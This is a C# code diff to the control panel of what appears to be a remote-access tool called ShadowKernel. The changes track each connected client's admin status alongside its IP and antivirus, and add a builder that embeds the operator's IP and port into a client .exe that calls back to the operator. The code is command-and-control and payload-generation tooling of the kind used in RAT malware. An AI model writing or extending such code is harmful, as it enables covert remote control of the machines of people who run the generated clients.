@@ -39,6 +39,7 @@ namespace ShadowKernel.userControls
         public static Chat C = new Chat();
         public static Image ImageToDisplay;
         public static BackgroundWorker bwUpdateImage;
+        public MainWindow wind;
 
         public static RDC RDC = new RDC();
         public static bool RDActive { get; set; }
@@ -51,19 +52,13 @@ namespace ShadowKernel.userControls
             bwUpdateImage = ((BackgroundWorker)this.FindResource("backgroundWorker"));
             bwUpdateImage.WorkerSupportsCancellation = true;
             serverFrm = (Server)wind.stgServer;
+            this.wind = wind;
         }
         public void Init()
         {
             
         }
 
-        private void MenuItem_Click(object sender, RoutedEventArgs e)
-        {
-            MainWindow wind = (MainWindow)Window.GetWindow(this);
-            SettingsClient stgClient = (SettingsClient)wind.stgClient;
-            wind.GridMain.Children.Clear();
-            wind.GridMain.Children.Add(stgClient);
-        }
 
         private void MenuItem_Click_1(object sender, RoutedEventArgs e)
         {
@@ -95,9 +90,8 @@ namespace ShadowKernel.userControls
         {
             GetRecievedData();
         }
-        private void Button_Click(object sender, RoutedEventArgs e)
+        public void Button_Click(object sender, RoutedEventArgs e)
         {
-            MainWindow wind = (MainWindow)Window.GetWindow(this);
             serverFrm = (Server)wind.server;
             serverFrm.GetDataLoop.Tick += new System.EventHandler(GetDataLoop_Tick); ;
             ushort port = GetPortSafe();
@@ -136,6 +130,7 @@ namespace ShadowKernel.userControls
         public class MyItem
         {
             public string ID { get; set; }
+            public string Admin { get; set; }
             public string IP { get; set; }
             public string Tag { get; set; }
             public string AV { get; set; }
@@ -313,6 +308,10 @@ namespace ShadowKernel.userControls
                 //case 20: //Message Type
                 //    AddWindTitle(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                 //    break;
+                
+                case 21: //Admin Type
+                    AddAdmin(ConnectionId, Encoding.UTF8.GetString(ToProcess));
+                    break;
             }
         }
 
@@ -342,6 +341,27 @@ namespace ShadowKernel.userControls
                 //}
             }
         }
+
+
+        /// <summary>
+        /// Gets Admin from client then updates list item
+        /// </summary>
+        /// <param name="ConnectionId"></param>
+        /// <param name="Admin"></param>
+        private void AddAdmin(int ConnectionId, string Admin)
+        {
+
+            for (int n = serverFrm.dtgClients.Items.Count - 1; n >= 0; --n)
+            {
+                MyItem LVI = (MyItem)serverFrm.dtgClients.Items[n];
+                if (LVI.ID.Contains(ConnectionId.ToString()))
+                    LVI.Admin = Admin;
+                serverFrm.dtgClients.Items[n] = LVI;
+
+                serverFrm.dtgClients.Items.Refresh();
+            }
+        }
+
 
         ///// <summary>
         ///// Gets active window title from client then updates list item
@@ -862,6 +882,40 @@ namespace ShadowKernel.userControls
             Port.Text = Properties.Settings.Default.Port.ToString();
             UpInt.Text = Properties.Settings.Default.UpdateInterval.ToString();
             notify.IsChecked = Properties.Settings.Default.Notfiy;
+        }
+
+        private void Button_Click_1(object sender, RoutedEventArgs e)
+        {
+            if(Tag.Text == "") { Tag.Focus(); return; }
+
+            string hostName = System.Net.Dns.GetHostName();
+            string myIP = System.Net.Dns.GetHostAddresses(hostName)[1].ToString();
+
+            Builder ClientBuilder = new Builder();
+            try
+            {
+                Convert.ToInt16(Port.Text);
+            }
+            catch (Exception EX)
+            {
+                System.Windows.Forms.MessageBox.Show("Error: " + EX.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+            SaveFileDialog dlg = new SaveFileDialog();
+            //dlg.InitialDirectory = Environment.CurrentDirectory + @"\Clients";
+            dlg.DefaultExt = ".exe"; // Default file extension
+            dlg.Filter = "Exe Files (.exe)|*.exe|All Files (*.*)|*.*";
+
+            if (dlg.ShowDialog() != DialogResult.Cancel)
+            {
+                // Save document
+                ClientBuilder.BuildClient(Port.Text, ShadowKernel.helper.Session.CurrentAuditer.Login.ToString(), myIP, dlg.FileName, Tag.Text, "1",
+                "False", "False");
+                System.Diagnostics.Process.Start("explorer.exe", dlg.FileName.Substring(0, dlg.FileName.LastIndexOf("\\")));
+
+            }
+            else { return; }
+
         }
     }
 }
